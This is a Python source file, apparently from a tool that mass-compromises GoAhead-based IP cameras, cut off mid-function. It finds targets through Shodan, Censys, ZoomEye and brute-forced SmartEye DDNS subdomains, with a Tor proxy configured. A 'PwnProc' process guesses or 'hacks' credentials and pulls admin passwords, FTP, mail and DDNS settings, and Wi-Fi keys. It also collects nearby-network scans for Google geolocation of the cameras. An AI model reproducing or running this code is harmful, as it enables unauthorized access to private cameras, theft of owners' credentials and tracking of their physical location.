from model import *
from peewee import OperationalError, ProgrammingError
from playhouse.pool import MaxConnectionsExceeded
from multiprocessing import Process, Pool, Queue, Value
from queue import Empty, Full
import sys
from json import dumps as json_dumps
from simplejson.errors import JSONDecodeError
from os import kill
from signal import signal, SIGALRM, SIGUSR1

import shodan
from censys.ipv4 import CensysIPv4
from censys.base import CensysException
import zoomeye

from string import ascii_lowercase
from itertools import product, chain, islice
from collections import Counter

from time import sleep, time
from random import random, shuffle
from re import compile as re_compile, sub as re_sub
from math import ceil

from http.client import HTTPConnection, RemoteDisconnected, BadStatusLine
from urllib.parse import urlparse
import socks
import socket
import requests
from types import SimpleNamespace

from base64 import b64encode
from hashlib import sha1
import codecs

# TOR cfg
proxies = {
    'http': 'socks5://host:9050',
    'https': 'socks5://host:9050'
}
proxyurl = urlparse(proxies['http'])

# Network and HeartBeat cfg
timeout = (9.15, 90)
socket.setdefaulttimeout(timeout[0])
heartBeat = [30, 12, 720]

# Feeder Creds cfg
SHODAN_API_KEY = ''  # Shodan 'Token'
Censys_CREDS = ['', '']  # Censys [UID, Secret]
Zoom_CREDS = ['', '']   # ZoomeEye [User, Pwd]


# Feeder Queries cfg
SHODAN_query = 'Server: GoAhead-Webs opaque="5ccc069c403ebaf9f0171e9517f40e41"'
SHODAN_STREAM_query = ['Server: GoAhead-Webs',
                       'opaque="5ccc069c403ebaf9f0171e9517f40e41"']
Censys_query = 'GoAhead-Webs and opaque=\"5ccc069c403ebaf9f0171e9517f40e41\"'
Zoom_query = '+headers:"GoAhead-Webs" +headers:"opaque=\\\"5ccc069c403ebaf9f0171e9517f40e41\\\""'

# Shodan workers cfg
SHODAN_sleep = 3
SHODAN_span = 1
SHODAN_workpages = 100  # Pages per worker

# Google GMaps cfg
GoogleAPI_TOKEN = ''  # GMaps Token

GoogleGeolocURL = 'https://www.googleapis.com/geolocation/v1/geolocate?key=%s'
GoogleGeocodURL = 'https://maps.googleapis.com/maps/api/geocode/json?language=en&key=%s'

GoogleGeolocHEADER = {'Content-Type': 'application/json',
                      'Cache-Control': 'no-cache'}

pat_wifi = re_compile(r'^(.+)\[(\d+)\][ ]*=[\"\']?([\w:\-]+?)[\"\']?;')
patn_wifi = re_compile(r'var ap_number=([\d]+?);')
pat_result = re_compile(r'var result="([\w\s]+?)";')
pat_smarteye = re_compile(r'var se_ddns_?(.+)=[\"]?(.*?)[\"]?;')
pat_oppolink = re_compile(r'var (.+)=[\"]?(.*?)[\"]?;')
pat_wifiap = re_compile(r'var wifi_(.+)=[\"]?([\w:\-\.\s]*?)[\"]?;')
cred_types = ['loginuser', 'loginpass']
data_types = ['alias', 'mac', 'wifimac', 'deviceid', 'sys_ver',
              'app_version', 'oem_id', 'sdstatus', 'syswifi_mode']
param_types = {'ddns', 'ftp', 'mail', 'user', 'wifi'}

patcredV = []
for cred_i in cred_types:
    patcredV.append(re_compile(r'var %s=[\"]([\S\s]+?)[\"];' % (cred_i)))

patdataV = {}
for data_i in data_types:
    patdataV[data_i] = re_compile(
        r'var %s=[\"]?([\w:\-\.]*?)[\"]?;' % (data_i))

pat_paramjsV = {}
for param_i in param_types:
    pat_paramjsV[param_i] = re_compile(
        r'var %s_?(.+)=[\"]?(.*?)[\"]?;' % (param_i))

# PwnProc and GeoProc cfg
DBM0_Comp = -120.0  # DBM0 Compensation
scan_wait = 10  # Scan wait, seconds
scan_retries = 3  # Scan retries
network_retries = 3  # Network retries
network_sleep = 10  # Network sleep, seconds
queue_timeout = 9  # Queue timeout, seconds
geoloc_timespan = 168  # Geoloc timespan, hours


class Protocam:
    """Protocam or Camera candidate object, defined by IP and Port and in some cases an id"""

    ip = ""
    port = 0
    id = None
    creds = None
    b64 = None

    def __init__(self, ip, port, id=None):
        """Protocam object, basic init function"""
        self.ip = ip
        self.port = port
        self.id = id

    def fromCam(camera):
        """Returns a Protocam object from a camera object stored in database"""

        addr = camera.get_addr()
        if addr is not None:
            protocam = Protocam(addr.ip, addr.port, camera.id)
            return protocam
        else:
            return None

    def fromCam_dict(camera):
        """Returns a Protocam object from a dictionary"""

        protocam = Protocam(camera['ip'], camera['port'], camera['id'])
        return protocam

    def fromAddr(addr):
        """Returns a Protocam object from an address object"""

        protocam = Protocam(addr.ip, addr.port)
        return protocam

    def fromFeeder(host):
        """Returns a Protocam object from a size 2 list"""

        protocam = Protocam(host[0], host[1])
        return protocam


class Camscan:
    """Camera + WifiScan object generated by PwnProc and consumed by GeoProc"""

    camera = None
    ts = None
    wifis = []
    ip = ''

    def __init__(self, camera, ts, wifis, ip):
        """Camscan object, basic init function"""

        self.camera = camera
        self.ts = ts
        self.wifis = wifis
        self.ip = ip


class FeederBase(Process):
    """Basic Feeder class process, has all the utilities required by the Feeders"""

    threadID = 0
    threadName = "FeederBase"
    feedingQueue = None
    runFlag = None

    def __init__(self, tID, tName, q):
        """FeederBase, basic init function"""

        Process.__init__(self)
        self.threadID = tID
        self.threadName = tName
        self.runFlag = Value('b', True)
        self.feedingQueue = q

    def checkAndSubmit(self, ip, port, level):
        """This method checks if a certain camera is already in database and online before submiting it to the feeding queue"""

        camera = Camera._get_by_addr(ip, port)
        if camera is not None:
            last_addr = camera.get_addr()
            rst = None
            if last_addr is not None:  # Get last addr
                if camera.retry > 2 or ip != last_addr.ip or port != int(last_addr.port):
                    # Already in DB but maybe offline
                    self.feedingQueue.put(Protocam.fromCam(camera), level)
                    if ip != last_addr.ip or port != int(last_addr.port):
                        rst = 0
                    else:
                        rst = 2
                else:
                    # No submit to queue
                    rst = 1
            else:  # Bug, cam candidate doesn't have last addr. This should never be executed.
                self.feedingQueue.put(Protocam.fromFeeder([ip, port]), level)
                rst = 0
        else:
            self.feedingQueue.put(Protocam.fromFeeder([ip, port]), level)
            rst = 0
        return rst

    def getFlag(self):
        """Returns the process running flag"""

        return self.runFlag.value

    def stop(self):
        """Sets the running flag to false, forcing the graceful exit of the process"""

        self.runFlag.value = False

    def myprint(self, string):
        """Custom print for the process, simplifies tracking"""

        print('[%s-%s] %s' % (self.threadName, self.threadID, string))
        sys.stdout.flush()


class DBProc(FeederBase):
    """DBProc looks for outdated cameras in DB and loads them as Protocams with id
    All the cameras should have less than 3 retrys
    Priority in feeding queue is 1"""

    timespan = 0  # hours

    def __init__(self, tID, q, t=12):
        """DBProc init function, sets process id and feeding queue
        The timespan defines what is considered an outdated camera"""

        FeederBase.__init__(self, tID, 'DBProc', q)
        self.timespan = t

    def run(self):
        """DBProc run function, downloads outdated cameras from DB and submit them to the feeeding queue"""

        self.myprint('Process starting')
        mycameras = Camera._get_outdated_dict(self.timespan)
        self.myprint('Results: found %s outdated cameras in DB' %
                     (len(mycameras)))

        if len(mycameras) != 0:
            for camera in mycameras:
                self.feedingQueue.put(Protocam.fromCam_dict(camera), 1)

        self.myprint('Process terminated')
        self.runFlag.value = False
        sys.exit()


class ShodanProc(FeederBase):
    """ShodanProc downloads camera candidates from ShodanProc
    This class works as a ShodanWorker controller"""

    api = None
    country = ''  # Experimental
    workers = []
    workersN = None
    tokenBucket = Queue(maxsize=1)
    haltTB = Queue()

    def __init__(self, tID, q, country):
        """ShodanProc init function, defines id, feeding queue and country"""

        FeederBase.__init__(self, tID, 'ShodanProc', q)
        self.api = shodan.Shodan(SHODAN_API_KEY)
        self.country = country
        self.workersN = Value('i', 0)

    def run(self):
        """ShodanProc run function, makes count() query then launches workers and enters in tocken bucket mode, while in this mode the process checks the workers heart beat"""

        self.myprint('Process starting')
        self.workers = [sw_p for sw_p in self.workers if sw_p.getFlag()]
        ok = False
        while(not ok):
            try:
                # Search Shodan
                if self.country is not None:
                    count = self.api.count(
                        SHODAN_query + ' country:"%s"' % (self.country))
                else:
                    count = self.api.count(SHODAN_query)
                ok = True
            except shodan.APIError as e:
                self.myprint('Error: %s' % e)
                sleep(SHODAN_sleep + random() * SHODAN_sleep)

        # Show the results
        self.myprint('Results found: %s' % count['total'])

        # Generate workers
        if count['total'] > 0:
            tpages = ceil(count['total'] / 100)
            tworkers = ceil(tpages / 100)
            for i in range(tworkers):
                sw_p = ShodanWorker(self.threadID, i, self.feedingQueue, self.country, range(
                    i, tpages + 1, tworkers), self.tokenBucket, self.haltTB)
                self.workers.append(sw_p)
                sw_p.start()
                sleep(SHODAN_span)

        while len(self.workers) != 0:
            self.workers = [
                sw_p for sw_p in self.workers if sw_p.getFlag() and sw_p.is_alive()]
            ulock = [[sw_p.getID(), kill(sw_p.pid, SIGALRM)]
                     for sw_p in self.workers if sw_p.beat() == 0]
            if len(ulock) != 0:  # Unlocking hanged processes
                self.myprint('Unlocking worker %s' %
                             ([sw_p[0] for sw_p in ulock]))
            self.workers = [
                sw_p for sw_p in self.workers if sw_p.getFlag() and sw_p.is_alive()]
            self.workersN.value = len(self.workers)  # Update shared value

            try:
                while not self.haltTB.empty():
                    self.haltTB.get(False)
                    self.myprint('Pause received')
                    sleep(SHODAN_sleep)
            except Empty:
                pass

            try:
                if not self.haltTB.full():
                    sleep(SHODAN_span)
                    self.tokenBucket.put(None, False)
                else:
                    sleep(SHODAN_span)
            except Full:
                sleep(SHODAN_span)
                pass

            if not self.runFlag.value:  # Halt
                (sw_p.stop() for sw_p in self.workers if sw_p.getFlag())

        self.myprint('Process terminated')
        self.runFlag.value = False
        sys.exit()

    def getWorkers(self):
        """Returns the number of workers"""

        return self.workersN.value


class ShodanWorker(ShodanProc):
    """ShodanWorker downloads up to 100 pages from Shodan and pushes the new camera candidates to the feeding queue
    Priority in feeding queue is 1 for pages < 200 and 2 for the rest"""

    worker = ""
    wrange = None
    heartBeat = None

    def __init__(self, tID, w, q, country, r, tB, hTB):
        """ShodanWorker init function, defines parent id, id, feeding queue, country, page number generator, and tocken bucket queue"""

        ShodanProc.__init__(self, tID, q, country)
        self.worker = w
        self.wrange = r
        self.tokenBucket = tB
        self.haltTB = hTB
        self.heartBeat = Value('i', heartBeat[2])
        signal(SIGALRM, PwnProc.signal_handler)
        self.workers = None
        self.workersN = None

    def run(self):
        """ShodanWorker run function
        In a loop, waits for tocken, then downloads page from Shodan and submits camera candidates to feeding queues
        If request rate if exceeeded notifies to tocken bucket"""

        self.myprint('Worker starting')
        for i in self.wrange:
            ok = False
            nq = 0
            while(not ok and self.runFlag.value and nq < 3):
                try:
                    self.resetHB()
                    self.tokenBucket.get(timeout=60)
                    self.resetHB()
                    if self.country is not None:
                        page = self.api.search(
                            SHODAN_query + ' country:"%s"' % (self.country), page=i + 1)
                    else:
                        page = self.api.search(SHODAN_query, page=i + 1)
                    self.resetHB()
                    h_counter = [0, 0, 0]  # [new, online, offline]
                    self.myprint('Query %s: %s hosts' %
                                 (str(i + 1), len(page['matches'])))
                    if len(page['matches']) != 0:
                        ok = True
                        lvl = 2 if i > 200 else 1  # Priotising last results
                        for host in page['matches']:
                            h_counter[self.checkAndSubmit(
                                host['ip_str'], int(host['port']), lvl)] += 1
                            sleep(0.1)  # Reduce DB overload
                        self.myprint('Result of query %s: %s hosts [%s new, %s online, %s offline]' % (
                            str(i + 1), len(page['matches']), h_counter[0], h_counter[1], h_counter[2]))
                    else:  # Very uncommon exception
                        nq += 1
                except shodan.APIError as e:
                    self.myprint('Error: %s' % e)
                    if str(e).find('Request rate limit reached') != -1:
                        self.myprint('Request rate limit exceeded')
                        self.haltTB.put(None)
                except GracefulUnlock:
                    self.myprint('Worker unlocked')
                except Empty:
                    self.myprint('Empty Queue Timeout')

        self.disableHB()
        self.myprint('Worker terminated')
        self.runFlag.value = False
        sys.exit()

    def signal_handler(signum, stack):
        """Handles SIGALARM signals from parent ShodanProc
        Called if the process hangs"""

        if signum == SIGALRM:
            raise GracefulUnlock()

    def resetHB(self):
        """Resets heart beat"""

        self.heartBeat.value = heartBeat[2]

    def disableHB(self):
        """Disables heart beat"""

        self.heartBeat.value = -1

    def beat(self):
        """Decrements and returns heart bead value"""

        hb = self.heartBeat.value
        self.heartBeat.value -= 1
        return hb

    def getID(self):
        """Returns id"""

        return self.threadID

    def myprint(self, string):
        """Custom print for the process, simplifies tracking"""

        print('[%s-%s:%s] %s' %
              (self.threadName, self.threadID, self.worker, string))
        sys.stdout.flush()


class ShodanStreamProc(FeederBase):
    """ShodanStreamProc processes a continous stream from Shodan scanners
    Results are filtered and then submited to the feeding queue
    Priority in feeding queue is 0"""

    api = None

    def __init__(self, tID, q):
        """ShodanStreamProc init function, defines id and feeding queue"""

        FeederBase.__init__(self, tID, 'ShodanStreamProc', q)
        self.api = shodan.Shodan(SHODAN_API_KEY)

    def run(self):
        """ShodanStreamProc run function
        Runs a coutinous stream from Shodan scanners
        Filters hosts and submits camera candidates to feeding queue"""

        self.myprint('Process starting')
        h_counter = [0, 0, 0]  # [new, online, offline]
        while self.runFlag.value:
            try:
                for host in self.api.stream.banners():
                    if not False in [q in host.get('data', '') for q in SHODAN_STREAM_query]:

                        h_counter[self.checkAndSubmit(host.get('ip_str', host.get(
                            'ipv6', '0.0.0.0')), int(host.get('port', 0)), 0)] += 1
                        self.myprint('Result: %s hosts [%s new, %s online, %s offline]' % (
                            sum(h_counter), h_counter[0], h_counter[1], h_counter[2]))

                    if not self.runFlag.value:  # Halt
                        break
            # except shodan.APIError:
            except Exception:
                pass
        self.myprint('Result: %s hosts [%s new, %s online, %s offline]' % (
            sum(h_counter), h_counter[0], h_counter[1], h_counter[2]))
        self.myprint('Process terminated')
        self.runFlag.value = False
        sys.exit()


class CensysProc(FeederBase):
    """CensysProc retrieves camera candidates from Censys
    This API allows access only to the first 10k host
    Priority in feeding queue is 1"""

    api = None

    def __init__(self, tID, q):
        """CensysProc init function, defines id and feeding queue"""

        FeederBase.__init__(self, tID, 'CensysProc', q)
        self.api = CensysIPv4(Censys_CREDS[0], Censys_CREDS[0])

    def run(self):
        """CensysProc run function
        Downloads camera candidates from Censys and submits them to feeding queue"""

        self.myprint('Process starting')
        try:
            h_counter = [0, 0, 0]  # [new, online, offline]
            t_counter = 0
            for host in self.api.search(Censys_query):
                ip = host['ip']
                http_ports = [int(p.split('/')[0])
                              for p in host['protocols'] if 'http' in p]
                for port in http_ports:

                    h_counter[self.checkAndSubmit(
                        host.get('ip', '0.0.0.0'), port, 1)] += 1
                    t_counter += 1

                    if t_counter % 100 == 0:  # Periodic display
                        self.myprint('Result %s: %s hosts [%s new, %s online, %s offline]' % (
                            t_counter // 100, sum(h_counter), h_counter[0], h_counter[1], h_counter[2]))
                        h_counter = [0, 0, 0]  # Reset
                if not self.runFlag.value:  # Halt
                    break
        except (CensysException):
            pass
        self.myprint('Result: %s hosts [%s new, %s online, %s offline]' % (
            sum(h_counter), h_counter[0], h_counter[1], h_counter[2]))
        self.myprint('Process terminated')
        self.runFlag.value = False
        sys.exit()


class ZoomEyeProc(FeederBase):
    """ZoomEyeProc retrieves camera candidates from ZoomEye
    Queries are limited to the first 125 pages due to free quota limitations
    Priority in feeding queue is 1"""

    api = None

    def __init__(self, tID, q):
        """ZoomEyeProc init function, defines id and feeding queue"""

        FeederBase.__init__(self, tID, 'ZoomEyeProc', q)
        self.api = zoomeye.ZoomEye()
        self.api.username = Zoom_CREDS[0]
        self.api.password = Zoom_CREDS[1]
        self.api.login()

    def run(self):
        """ZoomEyeProc run function
        Downloads camera candidates from ZoomEye and submits them to feeding queue"""

        self.myprint('Process starting')
        for p in range(125):
            h_counter = [0, 0, 0]  # [new, online, offline]
            hosts = self.search(Zoom_query, p + 1)
            for host in hosts:

                h_counter[self.checkAndSubmit(host[0], host[1], 1)] += 1

            self.myprint('Result of query %s: %s hosts [%s new, %s online, %s offline]' % (
                p, sum(h_counter), h_counter[0], h_counter[1], h_counter[2]))
            if not self.runFlag.value:  # Halt
                break
        self.myprint('Process terminated')
        self.runFlag.value = False
        sys.exit()

    def search(self, search, page):
        """ZoomEyeProc search function
        Downloads page with up to 20 camera candidates
        Supports retry if connection fails"""

        for _ in range(network_retries):
            try:
                hosts = [[host.get('ip'), int(host.get('portinfo').get('port'))] for host in self.api.dork_search(
                    search, page=page, resource='host', facet=['ip'])]
                return hosts
            except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                self.myprint('Unknown HTTP Error')
                sleep(network_sleep)
            except requests.exceptions.ConnectionError:
                self.myprint('Host ZoomEye Down')
                sleep(network_sleep)
        return []


class SmartEyeBase(FeederBase):
    """Basic SmartEye class process, based on SmartEye DDNS service
    SmartEye returns an HTTP/1.1 301 Moved Permanently with the last IP:Port submited by the camera to the service"""

    def __init__(self, tID, tName, q):
        """SmartEyeBase init function, defines id and feeding queue"""

        FeederBase.__init__(self, tID, tName, q)

    def process(se):
        """Process domain function, returns list with ip, port and domain"""

        try:
            url_host = SmartEyeBase.secure_get(se)
            if url_host is not None and url_host != '151.216.40.81:80':  # Blacklisted IP
                c_host = urlparse(url_host)
                return [c_host.hostname, c_host.port, se['domain']]
            else:
                return None
        except Exception as e:
            print('[SmartEye-X] Error: %s' % (e))
            return None

    def secure_get(se):
        """Secure GET function, returns forward URL in response header
        Destination domain is fixed and then the header is modified to match the subdomain, this reduces the DNS queries"""

        for _ in range(network_retries):
            try:
                # TOR may not be the best option
                return requests.get('http://%s' % (se['service']), headers={'Host': se['domain']}, timeout=timeout, allow_redirects=False).headers.get('Location', None)
            except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                print('[SmartEye-X] Unknown HTTP Error')
                sys.stdout.flush()
                sleep(network_sleep)
            except requests.exceptions.ConnectionError:
                print('[SmartEye-X] Host %s Down' % (url))
                sys.stdout.flush()
                sleep(network_sleep)
        return None


class SmartEyeDBProc(SmartEyeBase):
    """SmartEyeDBProc retrieves camera candidate domains from database, then submits them to SmartEye and downloads the new addresses of the cameras"""

    def __init__(self, tID, q):
        """SmartEyeDBProc init function, defines id and feeding queue"""

        SmartEyeBase.__init__(self, tID, 'SmartEyeDBProc', q)

    def run(self):
        """SmartEyeDBProc run function
        Downloads camera candidates from SmartEye and submits them to feeding queue"""

        self.myprint('Process starting')
        pool = Pool(10)
        mysmarteyes = SmartEye._get_distinct_id('www.nwsvr1.com')
        self.myprint('Results: found %s SmartEye cameras in DB' %
                     (len(mysmarteyes)))
        smart_iter = SmartEyeDBProc.chunks(mysmarteyes, 100)
        c_counter = 0
        for iter_i in smart_iter:
            hosts = pool.map(SmartEyeBase.process, iter_i)
            hosts = list(filter(None.__ne__, hosts))
            if len(hosts) > 0:
                l_host = hosts[-1][2]
            else:
                l_host = 'not available'
            h_counter = [0, 0, 0]
            for host in hosts:

                h_counter[self.checkAndSubmit(host[0], host[1], 1)] += 1

            self.myprint('Result batch %s: %s of %s hosts [%s new, %s online, %s offline], last subdomain: %s' % (
                c_counter, sum(h_counter), 100, h_counter[0], h_counter[1], h_counter[2], l_host))
            c_counter += 1
            if not self.runFlag.value:  # Halt
                break
        pool.terminate()
        self.myprint('Process terminated')
        self.runFlag.value = False
        sys.exit()

    def chunks(l, n):
        """Yield successive n-sized chunks from l"""

        for i in range(0, len(l), n):
            yield l[i:i + n]


class SmartEyeProc(SmartEyeBase):
    """SmartEyeProc guesses SmartEye subdomains and retrieves the camera addresses assigned to that domain"""

    def __init__(self, tID, q):
        """SmartEyeProc init function, defines id and feeding queue"""

        SmartEyeBase.__init__(self, tID, 'SmartEyeProc', q)

    def run(self):
        """SmartEyeProc run function
        Downloads the entire SmartEye subdomain space, then the matching candidates are submited them to the feeding queue"""

        self.myprint('Process starting')
        pool = Pool(10)
        iter_all = SmartEyeProc.iter_gen()
        c_counter = 0
        for iter_i in SmartEyeProc.grouper_it(100, iter_all):
            hosts = pool.map(SmartEyeBase.process, iter_i)
            hosts = list(filter(None.__ne__, hosts))
            if len(hosts) > 0:
                l_host = hosts[-1][2]
            else:
                l_host = 'not available'
            h_counter = [0, 0, 0]
            for host in hosts:

                h_counter[self.checkAndSubmit(host[0], host[1], 2)] += 1

            self.myprint('Result batch %s: %s of %s hosts [%s new, %s online, %s offline], last subdomain: %s' % (
                c_counter, sum(h_counter), 100, h_counter[0], h_counter[1], h_counter[2], l_host))
            c_counter += 1
            if not self.runFlag.value:  # Halt
                break
        pool.terminate()
        self.myprint('Process terminated')
        self.runFlag.value = False
        sys.exit()

    def url_gen(pref, rep, service):
        """Yields subdomain"""

        mylist = list(ascii_lowercase)
        shuffle(mylist)
        for abcd in product(mylist, repeat=rep):
            yield {'domain': '%s%s.nwsvr1.com' % (pref, ('').join(abcd)), 'service': service}

    def iter_gen():
        """Returns a chain of subdomain generators"""

        ds = [('005', 4, 'www.nwsvr1.com'), ('440ua', 3, 'www.nwsvr1.com'),
              ('AX1a', 3, 'www.nwsvr1.com'), ('WIPCa', 3, 'www.nwsvr1.com'),
              ('WIPCb', 3, 'www.nwsvr1.com')]
        mylist = list(range(len(ds)))
        shuffle(mylist)
        return chain(*(SmartEyeProc.url_gen(*ds[x]) for x in mylist))

    def grouper_it(n, iterable):
        """Yields a slice of n elements from iterable"""

        it = iter(iterable)
        while True:
            chunk_it = islice(it, n)
            try:
                first_el = next(chunk_it)
            except StopIteration:
                return
            yield chain((first_el,), chunk_it)


class PwnProc(Process):
    """PwnProc hacks and retrieves all the data available in the camera candidates received through the feeder queue
    Thies to match the current camera candidate with the already stored in the database and guesses a password based on the IP of the camera before proceeding to hack it
    Parses all the data available in the cgis of the camera and finally stores it if it's different with the last register in database
    The registers of wifiscan and wifis are always stored
    Outputs a camscan object, including the camera object and a list of the wifi objects generated during the processing and puts it in the feeder queue
    This process includes a heartbeat in order to be monitorized by the controller and unlocked or killed if it hangs"""

    threadID = 0
    threadName = "PwnProc"
    feederQueue = None
    feedingQueue = None
    runFlag = None
    heartBeat = None

    def __init__(self, tID, qin, qout=None):
        """PwnProc init function"""

        Process.__init__(self)
        self.threadID = tID
        self.feederQueue = qin
        self.feedingQueue = qout
        self.runFlag = Value('b', True)
        self.heartBeat = Value('i', heartBeat[0])
        signal(SIGALRM, PwnProc.signal_handler)
        signal(SIGUSR1, PwnProc.signal_handler)

    def run(self):
        """PwnProc run function
        Retrieves a camera candidate from the feeding queue, then retrieves from database the credentials when possible, or hacks it
        If the credentials are valid, downloads all the cgis of the camera and parses all the data available in the cgis of the camera and finally stores it if it's different with the last register in database
        The registers of wifiscan and wifis are always stored
        Outputs a camscan object, including the camera object and a list of the wifi objects generated during the processing and puts it in the feeder queue"""

        self.myprint('Process starting')
        while(self.runFlag.value):
            try:
                self.resetHB()
                protocam = self.feederQueue.get(
                    timeout=queue_timeout)  # Needs timeout
                self.myprint('Connecting %s:%s' % (protocam.ip, protocam.port))
                if protocam.id is not None:
                    '''If on DB, try DB creds'''
                    camera_candidate = Camera._get(protocam.id)
                else:
                    '''Last IP:Port'''
                    camera_candidate = Camera._get_by_addr(
                        protocam.ip, protocam.port)
                if camera_candidate is not None:
                    self.myprint('Camera candidate %s found in DB' %
                                 (camera_candidate.id))
                    creds = camera_candidate.get_creds()
                    if creds is not None:
                        result = self.test_creds(
                            protocam, [creds.user_admin, creds.passwd_admin], 1)
                        if result == 200:
                            protocam.creds = [
                                creds.user_admin, creds.passwd_admin]
                            self.myprint(
                                'Camera candidate has valid creds: %s' % (protocam.creds))
                        elif result is None:
                            addr = camera_candidate.get_addr()  # Compare with last address
                            if addr is not None:
                                if addr.ip == protocam.ip and addr.port == protocam.port:
                                    camera_candidate.set_offline()
                            continue
                        else:  # result != 200
                            if protocam.id is not None:
                                # This is not the cam we're looking for
                                camera_candidate.set_offline()
                                protocam.id = None
                                camera_candidate = None
                                self.myprint(
                                    'Camera candidate has not valid creds')
                if protocam.creds is None:
                    '''Not in DB or creds invalid, let's PWN'''
                    protocam.creds = self.get_creds(protocam)
                    if protocam.creds is not None:
                        self.myprint('Hacked creds: %s' % (protocam.creds))

                if protocam.creds is not None:  # We're in!
                    protocam.b64 = self.test_b64(protocam)
                    # [Alias, MAC, WIFIMAC, DEVICEID, SYS_VER, SD]
                    status = self.get_status(protocam)
                    if status is not None:
                        self.myprint('Status: %s' % (len(status)))
                    else:
                        continue

                    protocam.id = Camera.calc_id(
                        status['mac'], status['wifimac'], status['deviceid'])
                    if camera_candidate is not None:  # Two cameras same IP, port and creds but different ID
                        if protocam.id != camera_candidate.id:
                            addr = camera_candidate.get_addr()  # Compare with last address
                            if addr is not None:
                                if addr.ip == protocam.ip and addr.port == protocam.port:
                                    camera_candidate.set_offline()

                    # Params: Creds, DDNS, FTP, Mail, and WiFi AP
                    params = self.get_params(protocam)
                    self.myprint('Creds: %s, DDNS: %s, FTP: %s, Mail: %s, WiFi AP: %s' % (len(params['user']),
                                 len(params['ddns']), len(params['ftp']), len(params['mail']), len(params['wifi'])))

                    # Smart Eye place
                    smarteye = self.get_smarteye(protocam)
                    if len(smarteye) != 0:
                        self.myprint('SmartEye: %s' % (len(smarteye)))

                    # WiFi Scan
                    wifi_scan = self.get_wifi_scan(protocam)
                    self.myprint(
                        'WiFi Scan: recorded %s nearby networks' % (len(wifi_scan)))

                    # Set Camera
                    # Try to load camera from DB using calculated ID
                    camera = Camera._get(protocam.id)
                    if camera is not None:
                        camera.set_online()  # Reset retry
                        self.myprint('Camera %s found in DB' % (protocam.id))
                        if camera_candidate is not None:
                            # Compare Camera IDs
                            if not camera.cmp(camera_candidate):
                                camera_candidate.set_offline()  # False candidate put offline
                                self.myprint(
                                    'Camera doesn\'t match candidate: %s - %s' % (camera.id, camera_candidate.id))
                            else:
                                self.myprint(
                                    'Camera matches candidate: %s - %s' % (camera.id, camera_candidate.id))
                    else:  # If no coincidence create new cam
                        camera = Camera._create(
                            status['mac'], status['wifimac'], status['deviceid'])
                        self.myprint('New camera registered: %s' %
                                     (protocam.id))

                    # Store changes
                    ts = Timestamp._create()
                    scan = Wifi_scan._create(camera, ts,
                                             params['wifi']['enable'])

                    cam_addr = camera.get_addr()
                    if cam_addr is not None:
                        if not cam_addr.cmp(protocam.ip, protocam.port):
                            # Check last valid addr, prevent multiWAN and multiPort
                            if self.test_creds(Protocam.fromAddr(cam_addr), protocam.creds, 1) != 200:
                                Address._create(
                                    camera, ts, protocam.ip, protocam.port)
                    else:
                        Address._create(camera, ts, protocam.ip, protocam.port)

                    if len(params['user']) == 0:
                        params['user'] = {
                            '3_name': protocam.creds[0],
                            '3_pwd': protocam.creds[1]}
                    cam_creds = camera.get_creds()
                    if cam_creds is not None:
                        if not cam_creds.cmp_dict(params['user']):
                            Credentials._create_dict(
                                camera, ts, params['user'])
                    else:
                        Credentials._create_dict(camera, ts, params['user'])

                    if len(params['ddns']) != 0:
                        cam_ddns = camera.get_ddns()
                        if cam_ddns is not None:
                            if not cam_ddns.cmp_dict(params['ddns']):
                                DDNS._create_dict(camera, ts, params['ddns'])
                        else:
                            DDNS._create_dict(camera, ts, params['ddns'])

                    cam_ftp = camera.get_ftp()
                    if len(params['ftp']) != 0:
                        if cam_ftp is not None:
                            if not cam_ftp.cmp_dict(params['ftp']):
                                cam_ftp = FTP._create_dict(camera, ts,
                                                           params['ftp'])
                        else:
                            cam_ftp = FTP._create_dict(camera, ts,
                                                       params['ftp'])

                    if len(params['mail']) != 0:
                        cam_mail = camera.get_mail()
                        if cam_mail is not None:
                            if not cam_mail.cmp_dict(params['mail']):
                                Mail._create_dict(camera, ts, params['mail'])
                        else:
                            Mail._create_dict(camera, ts, params['mail'])

                    # To Dict
                    cam_status = camera.get_status()
                    if cam_status is not None:
                        if not cam_status.cmp(status['alias'], status['sys_ver'], status['app_version'], status['oem_id'], status['sdstatus'], status['syswifi_mode']):
                            Status._create(camera, ts, status['alias'], status['sys_ver'], status['app_version'],
                                           status['oem_id'], status['sdstatus'], status['syswifi_mode'])
                    else:
                        Status._create(camera, ts, status['alias'], status['sys_ver'], status['app_version'],
                                       status['oem_id'], status['sdstatus'], status['syswifi_mode'])

                    if len(smarteye) != 0:
                        cam_smarteye = camera.get_smarteye()
                        if cam_smarteye is not None:
                            if not cam_smarteye.cmp_dict(smarteye):
                                SmartEye._create_dict(camera, ts, smarteye)
                        else:
                            SmartEye._create_dict(camera, ts, smarteye)

                    if int(params['wifi']['enable']) == 1:
                        authtype = int(params['wifi']['authtype'])
                        cam_wifiap = camera.get_wifiap()
                        if authtype == 0:
                            if cam_wifiap is not None:
                                if not cam_wifiap.cmp(params['wifi'].get('ssid', ''), params['wifi']['mode'], 0, False, '', False):
                                    Wifi_AP._create_open(scan, params['wifi'].get(
                                        'ssid', ''), params['wifi']['mode'])
                            else:
                                Wifi_AP._create_open(scan, params['wifi'].get(
                                    'ssid', ''), params['wifi']['mode'])
                        if authtype == 1:
                            if 'key%s' % (int(params['wifi']['defkey']) + 1) in params['wifi'] and 'key%s_bits' % (int(params['wifi']['defkey']) + 1) in params['wifi']:
                                password = params['wifi']['key%s' % (
                                    int(params['wifi']['defkey']) + 1)]
                                password_bits = params['wifi']['key%s' % (
                                    int(params['wifi']['defkey']) + 1)] == 1
                                if int(params['wifi']['keyformat']) == 0:
                                    if cam_wifiap is not None:
                                        if not cam_wifiap.cmp(params['wifi'].get('ssid', ''), params['wifi']['mode'], 1, params['wifi']['encrypt'] == 1, password, password_bits):
                                            Wifi_AP._create_wep(scan, params['wifi'].get('ssid', ''), params['wifi']['mode'],
                                                                params['wifi']['encrypt'] == 1, password, password_bits)
                                    else:
                                        Wifi_AP._create_wep(scan, params['wifi'].get('ssid', ''), params['wifi']['mode'],
                                                            params['wifi']['encrypt'] == 1, password, password_bits)
                                else:
                                    if cam_wifiap is not None:
                                        if not cam_wifiap.cmp(params['wifi'].get('ssid', ''), params['wifi']['mode'], 1, params['wifi']['encrypt'] == 1, codecs.encode(bytearray(password, 'utf-8'), "hex").decode("ascii"), password_bits):
